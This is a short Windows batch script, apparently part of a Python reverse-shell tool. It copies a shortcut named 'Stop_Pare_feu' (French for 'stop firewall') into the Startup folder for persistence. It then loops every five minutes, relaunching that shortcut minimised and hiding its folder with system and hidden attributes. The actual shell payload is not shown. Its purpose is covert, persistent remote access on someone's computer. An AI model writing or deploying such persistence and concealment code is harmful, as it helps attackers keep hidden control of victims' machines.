chcp 1250
attrib -s -h python
cd %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu
copy %USERPROFILE%\Downloads\Shell_Reverse_Python\python\Stop_Pare_feu.lnk Programs\Startup
cd %USERPROFILE%\Downloads\Shell_Reverse_Python
:a
attrib -s -h python
cd python
start /min Stop_Pare_feu.lnk
cd ..
attrib +s +h python
timeout 300
goto a